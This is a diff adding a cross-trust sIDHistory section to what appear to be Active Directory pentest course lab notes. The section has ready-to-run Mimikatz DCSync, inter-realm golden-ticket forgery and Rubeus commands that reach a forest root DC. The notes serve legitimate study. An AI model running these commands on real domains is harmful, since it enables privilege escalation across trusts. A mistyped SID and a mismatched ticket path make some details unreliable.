@@ -381,7 +381,22 @@ winrs -r:dcorp-mgmt cmd
 #keep in mind that you have the TGS not the TGT. means you can only access the dcorp-mgmt machine through http service only
 ```
 
+Across Trusts
+```powershell
+# In an sIDHistory attack, the goal is to exploit the sIDHistory attribute of Active Directory objects (like users or groups) to escalate privileges. The sIDHistory attribute stores the Security Identifiers (SIDs) of the user from previous domains or previous states, and attackers can manipulate this to impersonate high-privilege accounts.
+# If a user wants to access a service in a different domain, their DC can issue an inter-realm ticket. This ticket is used to authenticate the user to the DC of the other domain (the trusting domain) and access services there.
+# In this attack, what you're forging is a Ticket Granting Ticket (TGT) that includes a fake or injected sIDHistory with the SID of a privileged account (like Domain Admin). Once you get a TGT with this forged sIDHistory, you can use it to request access to services as if you were the privileged account.
 
+#1- DCSync Attack to get the trust key from the Account Type: TRUST_ACCOUNT
+Invoke-Mimikatz-Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+
+#2- Forge inter-realm TGT #Page No.230
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-15-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+
+#3- Use Rubeus to request TGS
+Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+ls \\mcorp-dc.moneycorp.local\c$
+```
 
 
 
